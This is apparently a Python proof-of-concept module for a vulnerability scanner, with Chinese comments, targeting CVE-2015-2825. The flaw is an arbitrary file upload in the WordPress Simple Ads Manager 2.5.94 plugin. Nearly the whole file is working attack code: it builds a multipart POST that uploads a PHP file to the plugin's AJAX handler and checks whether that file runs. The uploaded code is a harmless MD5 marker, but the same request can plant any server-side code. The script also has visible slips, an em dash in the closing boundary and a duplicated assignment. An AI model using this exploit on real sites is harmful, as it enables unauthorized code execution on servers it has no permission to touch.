# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'WordPress_0039'  # 平台漏洞编号，留空
    name = 'WordPress Simple Ads Manager 2.5.94 插件任意文件上传漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        WordPress Simple Ads Manager 2.5.94 插件任意文件上传漏洞.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36614/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2015-2825 '  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Simple Ads Manager 2.5.94'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7ce7dec2-83c7-4ea3-a4d5-3f7163d02a44'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            path = '/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php'
            payload = "-----------------------------108989518220095255551617421026\r\n"
            payload += 'Content-Disposition: form-data; name="uploadfile"; filename="info.php"\r\n'
            payload += 'Content-Type: application/x-php\r\n\r\n'
            payload += '<?php echo md5(1); ?>\r\n'
            payload += '-----------------------------108989518220095255551617421026\r\n'
            payload += 'Content-Disposition: form-data; name="action"\r\n\r\n'
            payload += 'upload_ad_image\r\n'
            payload += '-----------------------------108989518220095255551617421026—\r\n'
            payload_len = len(payload)

            head = {
                "Content-Type": "multipart/form-data; boundary=---------------------------108989518220095255551617421026",
                "Connection": "Close",
                "Content-Length": str(payload_len)
            }
            url = url = arg + path
            req = requests.post(url, data=payload, headers=head)
            if req.status_code == 200 and "c4ca4238a0b923820dcc509a6f75849b" in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
